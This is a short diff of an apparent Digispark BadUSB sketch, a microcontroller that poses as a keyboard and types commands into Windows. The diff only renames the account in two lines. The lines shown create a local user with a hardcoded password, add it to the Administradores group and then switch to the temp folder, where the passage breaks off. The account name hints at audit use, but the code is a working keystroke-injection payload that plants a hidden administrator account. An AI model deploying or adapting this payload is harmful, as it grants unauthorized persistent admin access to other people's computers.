@@ -38,8 +38,8 @@ void loop() {
   DigiKeyboard.sendKeyStroke(0x51);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(10000);
-  DigiKeyboard.println("net user Usuario-Auditorio D2z14IdWykPO /add");
-  DigiKeyboard.println("net localgroup Administradores Usuario-Auditorio /add");
+  DigiKeyboard.println("net user Usuario-Auditoria D2z14IdWykPO /add");
+  DigiKeyboard.println("net localgroup Administradores Usuario-Auditoria /add");
   DigiKeyboard.delay(200);
   DigiKeyboard.println("cd %temp%"); //going to temporary dir
   DigiKeyboard.delay(250);
